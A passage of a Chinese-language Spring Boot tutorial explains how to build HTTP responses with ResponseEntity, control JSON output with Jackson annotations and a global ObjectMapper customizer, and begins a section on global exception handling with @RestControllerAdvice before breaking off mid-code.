<h5 id="3-如何创建和使用-ResponseEntity"><a href="#3-如何创建和使用-ResponseEntity" class="headerlink" title="3. 如何创建和使用 ResponseEntity"></a>3. 如何创建和使用 <code>ResponseEntity</code></h5><p>Spring 提供了非常便利的<strong>静态工厂方法</strong>和<strong>链式构建器 (Builder)</strong> 来创建 <code>ResponseEntity</code> 实例。</p>
<h6 id="a-使用静态工厂方法-最常用"><a href="#a-使用静态工厂方法-最常用" class="headerlink" title="a. 使用静态工厂方法 (最常用)"></a>a. 使用静态工厂方法 (最常用)</h6><p>这些方法通常以状态码命名，非常直观。</p>
<ul>
<li><p><strong>返回 200 OK</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/users/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.findById(id);</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ResponseEntity.ok() 创建一个状态码为 200 的响应</span></span><br><span class="line">        <span class="comment">// .body(user) 可以省略，直接 ResponseEntity.ok(user)</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().body(user); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>返回 404 Not Found</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...接上例</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ResponseEntity.notFound() 创建一个状态码为 404 的响应</span></span><br><span class="line">    <span class="comment">// .build() 用于构建一个没有响应体的 ResponseEntity</span></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.notFound().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>返回 201 Created (创建资源)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestBody</span> User newUser)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">savedUser</span> <span class="operator">=</span> userService.save(newUser);</span><br><span class="line">    <span class="comment">// 构建新资源的URI，用于放入Location头</span></span><br><span class="line">    <span class="type">URI</span> <span class="variable">location</span> <span class="operator">=</span> ServletUriComponentsBuilder.fromCurrentRequest()</span><br><span class="line">            .path(<span class="string">&quot;/&#123;id&#125;&quot;</span>)</span><br><span class="line">            .buildAndExpand(savedUser.getId())</span><br><span class="line">            .toUri();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ResponseEntity.created(uri) 创建一个 201 状态码的响应，并自动设置 Location 头</span></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.created(location).body(savedUser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>返回 204 No Content (无内容)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(&quot;/users/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">deleteUser</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">    userService.deleteById(id);</span><br><span class="line">    <span class="comment">// ResponseEntity.noContent() 创建一个 204 状态码的响应</span></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>返回 400 Bad Request (错误请求)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">createUser</span><span class="params">(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> UserDTO userDto)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 假设某些业务逻辑校验失败</span></span><br><span class="line">    <span class="keyword">if</span> (userService.isUsernameTaken(userDto.getUsername())) &#123;</span><br><span class="line">         <span class="comment">// ResponseEntity.badRequest() 创建一个 400 状态码的响应</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.badRequest().body(<span class="string">&quot;Username is already taken.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h6 id="b-使用链式构建器-更灵活"><a href="#b-使用链式构建器-更灵活" class="headerlink" title="b. 使用链式构建器 (更灵活)"></a>b. 使用链式构建器 (更灵活)</h6><p>如果你需要设置更复杂的状态码或自定义响应头，可以使用构建器模式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/custom&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">customResponse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.ACCEPTED) <span class="comment">// 设置状态码为 202 Accepted</span></span><br><span class="line">            .header(<span class="string">&quot;X-Custom-Header&quot;</span>, <span class="string">&quot;MyCustomValue&quot;</span>) <span class="comment">// 添加自定义响应头</span></span><br><span class="line">            .header(HttpHeaders.CACHE_CONTROL, <span class="string">&quot;max-age=3600&quot;</span>) <span class="comment">// 添加标准的响应头</span></span><br><span class="line">            .body(<span class="string">&quot;This is a custom response body.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-ResponseEntity-的核心优势"><a href="#4-ResponseEntity-的核心优势" class="headerlink" title="4. ResponseEntity 的核心优势"></a>4. <code>ResponseEntity</code> 的核心优势</h5><ol>
<li><strong>完全的HTTP响应控制</strong>: 让你能够精确控制状态码、响应头和响应体，是实现真正RESTful API的基石。</li>
<li><strong>代码可读性强</strong>: <code>ResponseEntity.ok()</code>, <code>ResponseEntity.notFound()</code> 等方法让代码的意图一目了然，明确表达了API的返回契约。</li>
<li><strong>灵活性</strong>: 无论是简单的成功响应，还是复杂的带自定义头的错误响应，<code>ResponseEntity</code> 都能优雅地处理。</li>
<li><strong>遵循RESTful最佳实践</strong>: 正确使用HTTP状态码是RESTful设计的重要原则。<code>ResponseEntity</code> 鼓励并简化了这一实践。</li>
</ol>
<p><strong>总结</strong></p>
<p>在现代基于Spring的REST API开发中，<strong>将Controller方法的返回类型声明为 <code>ResponseEntity&lt;T&gt;</code> 是一种最佳实践</strong>。它将HTTP协议的细节以一种优雅、类型安全的方式暴露给开发者，使得我们能够构建出更专业、更健壮、更符合Web标准的应用程序接口。</p>
<hr>
<h4 id="1-4-2-JSON序列化"><a href="#1-4-2-JSON序列化" class="headerlink" title="1.4.2 JSON序列化"></a>1.4.2 <code>JSON序列化</code></h4><h5 id="1-什么是序列化与反序列化？"><a href="#1-什么是序列化与反序列化？" class="headerlink" title="1. 什么是序列化与反序列化？"></a>1. 什么是序列化与反序列化？</h5><p>在Web API的上下文中：</p>
<ul>
<li><strong>序列化 (Serialization)</strong>:<ul>
<li><strong>过程</strong>: 将服务端的 <strong>Java 对象</strong>（如 <code>User</code>、<code>List&lt;Product&gt;</code>）转换为一种可以在网络上传输的、标准化的<strong>文本格式</strong>（通常是 <strong>JSON</strong> 字符串）的过程。</li>
<li><strong>方向</strong>: <code>Java Object -&gt; JSON String</code></li>
<li><strong>何时发生</strong>: 当 <code>@RestController</code> 的方法返回一个Java对象时，Spring MVC会在将响应写入HTTP响应体之前，自动对其进行序列化。</li>
</ul>
</li>
<li><strong>反序列化 (Deserialization)</strong>:<ul>
<li><strong>过程</strong>: 将从客户端HTTP请求体中接收到的 <strong>JSON 字符串</strong>，转换为服务端能够理解和处理的 <strong>Java 对象</strong>的过程。</li>
<li><strong>方向</strong>: <code>JSON String -&gt; Java Object</code></li>
<li><strong>何时发生</strong>: 当Controller方法的参数被 <code>@RequestBody</code> 注解标记时，Spring MVC会自动读取请求体中的JSON数据，并将其反序列化为指定的Java对象。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-Spring-Boot-与-Jackson-的无缝集成"><a href="#2-Spring-Boot-与-Jackson-的无缝集成" class="headerlink" title="2. Spring Boot 与 Jackson 的无缝集成"></a>2. Spring Boot 与 Jackson 的无缝集成</h5><p>Spring Boot 默认选择 <strong>Jackson</strong> (<code>jackson-databind</code> 库)作为其首选的JSON处理库。当你引入 <code>spring-boot-starter-web</code> 或 <code>spring-boot-starter-webflux</code> 时，Jackson 相关的依赖已经被自动包含进来了。</p>
<p>Spring Boot 的自动配置机制会为你完成所有繁琐的整合工作：</p>
<ol>
<li><strong>自动配置 <code>ObjectMapper</code></strong>:<ul>
<li><code>ObjectMapper</code> 是 Jackson 库中进行序列化和反序列化的核心类。</li>
<li>Spring Boot 会自动创建一个预配置好的 <code>ObjectMapper</code> Bean，并将其注册到IoC容器中。这个默认的 <code>ObjectMapper</code> 已经配置了许多最佳实践，比如：<ul>
<li>忽略JSON中未知属性（避免因客户端多传了字段而导致反序列化失败）。</li>
<li>正确处理Java 8的日期时间类型（<code>LocalDate</code>, <code>LocalDateTime</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>自动注册 <code>MappingJackson2HttpMessageConverter</code></strong>:<ul>
<li>这是一个 <code>HttpMessageConverter</code> 的实现，它专门使用 <code>ObjectMapper</code> 来处理 <code>application/json</code> 类型的HTTP请求和响应。</li>
<li>正是这个转换器，在背后默默地为你完成了所有的序列化和反序列化工作。</li>
</ul>
</li>
</ol>
<p><strong>整个过程对开发者是完全透明的</strong>。你只需要在Controller中返回或接收Java对象，Spring Boot和Jackson会处理好剩下的一切。</p>
<hr>
<h5 id="3-Jackson-常用注解"><a href="#3-Jackson-常用注解" class="headerlink" title="3. Jackson 常用注解"></a>3. Jackson 常用注解</h5><p>尽管默认配置已经很好用，但在很多场景下，我们需要对JSON的转换过程进行更精细的控制。Jackson提供了一系列强大的注解来实现这一点。这些注解通常加在<strong>POJO类的字段或getter&#x2F;setter方法</strong>上。</p>
<h6 id="a-控制字段的包含与排除"><a href="#a-控制字段的包含与排除" class="headerlink" title="a. 控制字段的包含与排除"></a>a. 控制字段的包含与排除</h6><ul>
<li><p><strong><code>@JsonIgnore</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 在序列化和反序列化时，<strong>完全忽略</strong>被此注解标记的字段。</li>
<li><strong>场景</strong>: 常用于忽略敏感信息（如密码）或内部状态字段。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="meta">@JsonIgnore</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 这个字段永远不会出现在JSON中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@JsonInclude(JsonInclude.Include.NON_NULL)</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 在序列化时，<strong>只包含那些值不为 <code>null</code> 的字段</strong>。</li>
<li><strong>场景</strong>: 节省网络带宽，使JSON响应更紧凑。可以标记在类上，对所有字段生效；也可以标记在单个字段上。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String description; <span class="comment">// 如果description为null，则JSON中不会有这个key</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(其他选项如 <code>NON_EMPTY</code>, <code>NON_DEFAULT</code> 也很有用)</p>
</li>
<li><p><strong><code>@JsonIgnoreProperties({&quot;prop1&quot;, &quot;prop2&quot;})</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 在类级别使用，指定一个<strong>要忽略的字段列表</strong>。</li>
<li><strong>场景</strong>: 当你无法修改源码（如第三方库的类）但又想忽略其某些字段时，可以通过Mixin技术配合使用。也常用于解决双向引用导致的无限递归问题。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="b-控制字段的名称"><a href="#b-控制字段的名称" class="headerlink" title="b. 控制字段的名称"></a>b. 控制字段的名称</h6><ul>
<li><p><strong><code>@JsonProperty(&quot;custom_name&quot;)</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 为Java字段指定一个<strong>自定义的JSON属性名</strong>。</li>
<li><strong>场景</strong>: 当Java的命名规范（camelCase，如 <code>firstName</code>）与前端或API契约要求的命名规范（snake_case，如 <code>first_name</code>）不一致时。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@JsonProperty(&quot;first_name&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化结果: &#123;&quot;first_name&quot;: &quot;...&quot;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h6 id="c-控制日期和时间的格式"><a href="#c-控制日期和时间的格式" class="headerlink" title="c. 控制日期和时间的格式"></a>c. 控制日期和时间的格式</h6><ul>
<li><p><strong><code>@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 精确控制 <code>Date</code>, <code>Calendar</code>, <code>LocalDateTime</code> 等日期时间类型在JSON中的格式。</li>
<li><strong>场景</strong>: 统一API的日期时间格式，避免因默认格式（如时间戳或ISO-8601）不满足需求而产生的问题。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化结果: &#123;&quot;createTime&quot;: &quot;2023-10-27 15:30:00&quot;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h6 id="d-控制枚举-Enum-的序列化"><a href="#d-控制枚举-Enum-的序列化" class="headerlink" title="d. 控制枚举 (Enum) 的序列化"></a>d. 控制枚举 (Enum) 的序列化</h6><ul>
<li><p><strong><code>@JsonValue</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 指定使用枚举中的<strong>哪个方法或字段的返回值</strong>作为其JSON表示。</li>
<li><strong>场景</strong>: 默认枚举序列化为它的名字（<code>&quot;PENDING&quot;</code>），如果你想序列化为它的某个属性（如一个整数代码 <code>1</code>）。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Status</span> &#123;</span><br><span class="line">    PENDING(<span class="number">1</span>, <span class="string">&quot;待处理&quot;</span>),</span><br><span class="line">    PROCESSING(<span class="number">2</span>, <span class="string">&quot;处理中&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 构造函数 ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@JsonValue</span> <span class="comment">// 指定使用getCode()的返回值进行序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化结果: 1 (而不是 &quot;PENDING&quot;)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="4-全局定制-ObjectMapper"><a href="#4-全局定制-ObjectMapper" class="headerlink" title="4. 全局定制 ObjectMapper"></a>4. 全局定制 <code>ObjectMapper</code></h5><p>如果你想对所有JSON序列化&#x2F;反序列化行为进行统一的、全局的配置（例如，所有日期都按特定格式，所有<code>null</code>值都不序列化），而不是在每个POJO上都加注解，你可以通过自定义 <code>ObjectMapper</code> Bean 来实现。</p>
<p>在Spring Boot中，最推荐的方式是定义一个 <code>Jackson2ObjectMapperBuilderCustomizer</code> Bean。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonInclude;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.jackson.Jackson2ObjectMapperBuilderCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Jackson2ObjectMapperBuilderCustomizer <span class="title function_">jsonCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder -&gt; &#123;</span><br><span class="line">            <span class="comment">// 全局设置：序列化时，所有为null的字段都不参与</span></span><br><span class="line">            builder.serializationInclusion(JsonInclude.Include.NON_NULL);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 全局设置：美化输出（开发时有用，生产环境建议关闭以节省带宽）</span></span><br><span class="line">            builder.featuresToEnable(SerializationFeature.INDENT_OUTPUT);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 全局设置：禁用将日期序列化为时间戳的行为</span></span><br><span class="line">            builder.featuresToDisable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 全局设置：所有Date类型的日期格式</span></span><br><span class="line">            builder.dateFormat(<span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这种方式，你可以在不侵入业务POJO的情况下，实现对JSON行为的全局统一控制。</p>
<p><strong>总结</strong></p>
<p>JSON序列化是现代Web API的“通用语言”。Spring Boot通过与Jackson的深度集成，提供了“零配置”的开箱即用体验。同时，通过丰富的注解和灵活的全局配置，Jackson也赋予了开发者完全掌控JSON数据格式的能力，以满足各种复杂的业务需求。</p>
<hr>
<h3 id="1-5-Web层通用功能"><a href="#1-5-Web层通用功能" class="headerlink" title="1.5 Web层通用功能"></a>1.5 Web层通用功能</h3><h4 id="1-5-1-全局异常处理"><a href="#1-5-1-全局异常处理" class="headerlink" title="1.5.1 全局异常处理"></a>1.5.1 全局异常处理</h4><h5 id="1-为什么需要全局异常处理？"><a href="#1-为什么需要全局异常处理？" class="headerlink" title="1. 为什么需要全局异常处理？"></a>1. 为什么需要全局异常处理？</h5><p>在Web应用开发中，异常是不可避免的。例如：</p>
<ul>
<li><strong>业务异常</strong>: 用户名已存在、余额不足、订单不存在等。</li>
<li><strong>参数校验异常</strong>: 客户端传入的参数不符合格式 (<code>MethodArgumentNotValidException</code>)。</li>
<li><strong>认证&#x2F;授权异常</strong>: 用户未登录、权限不足 (<code>AccessDeniedException</code>)。</li>
<li><strong>系统异常</strong>: 空指针 (<code>NullPointerException</code>)、数据库连接失败等。</li>
</ul>
<p>如果不对这些异常进行处理，Spring Boot的默认行为通常是向客户端返回一个包含大量堆栈信息的、不友好的HTML错误页面（或JSON错误对象）。</p>
<p><strong>默认的错误响应示例</strong>:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-10-27T08:30:00.123+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">500</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Internal Server Error&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.NullPointerException: ... (长长的堆栈信息) ...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/users/123&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>这种默认响应的问题</strong>:</p>
<ol>
<li><strong>用户体验差</strong>: 暴露了技术细节，用户看不懂也无法处理。</li>
<li><strong>安全风险</strong>: 堆栈信息可能会泄露服务器的内部实现、库版本等敏感信息。</li>
<li><strong>格式不统一</strong>: 不同的异常可能导致不同格式的响应，不利于前端统一处理。</li>
</ol>
<p><strong>全局异常处理的目标</strong>：创建一个<strong>统一的、集中的机制</strong>来捕获应用程序中抛出的各种异常，并根据异常的类型，返回<strong>结构化的、对客户端友好的、统一格式的错误响应</strong>。</p>
<hr>
<h5 id="2-核心注解"><a href="#2-核心注解" class="headerlink" title="2. 核心注解"></a>2. 核心注解</h5><p>Spring MVC提供了两个核心注解来实现全局异常处理：</p>
<ul>
<li><strong><code>@ControllerAdvice</code></strong> (或其变体 <code>@RestControllerAdvice</code>)<ul>
<li><strong>作用</strong>: 这是一个<strong>组件注解</strong>，用于标记一个类。被标记的类会成为一个<strong>全局的增强控制器</strong>。</li>
<li><strong>职责</strong>: 它可以**“横切”**到所有的（或指定的）<code>@Controller</code> 或 <code>@RestController</code> 上，用于集中处理那些原本需要在多个Controller中重复编写的逻辑，最典型的就是异常处理和全局数据绑定。</li>
<li><strong><code>@RestControllerAdvice</code></strong>: 是 <code>@ControllerAdvice</code> 和 <code>@ResponseBody</code> 的组合。它表示这个类中的所有 <code>@ExceptionHandler</code> 方法的返回值都将直接序列化为JSON并写入响应体，这在构建RESTful API时是首选。</li>
</ul>
</li>
<li><strong><code>@ExceptionHandler</code></strong><ul>
<li><strong>作用</strong>: 用于标记一个<strong>方法</strong>，这个方法必须定义在 <code>@ControllerAdvice</code> 类中（或单个 <code>@Controller</code> 类中）。</li>
<li><strong>职责</strong>: 声明这个方法是用来<strong>处理特定类型的异常</strong>的。你可以在注解的 <code>value</code> 属性中指定它能处理的一个或多个异常类。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-实现一个全局异常处理器"><a href="#3-实现一个全局异常处理器" class="headerlink" title="3. 实现一个全局异常处理器"></a>3. 实现一个全局异常处理器</h5><p>下面是一个典型的全局异常处理器的实现步骤和示例：</p>
<p><strong>Step 1: 创建一个全局异常处理类</strong></p>
<p>创建一个类，并使用 <code>@RestControllerAdvice</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestControllerAdvice;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @RestControllerAdvice 会自动扫描所有被@RestController或@Controller标记的类</span></span><br><span class="line"><span class="comment">// 也可以指定扫描范围，如 @RestControllerAdvice(basePackages = &quot;com.example.controller&quot;)</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="comment">// ... 在这里定义异常处理方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Step 2: 编写针对不同异常的处理方法</strong></p>
<p>在类中，为不同类型的异常编写相应的处理方法，并使用 <code>@ExceptionHandler</code> 标记。</p>
<p><strong>示例代码</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> 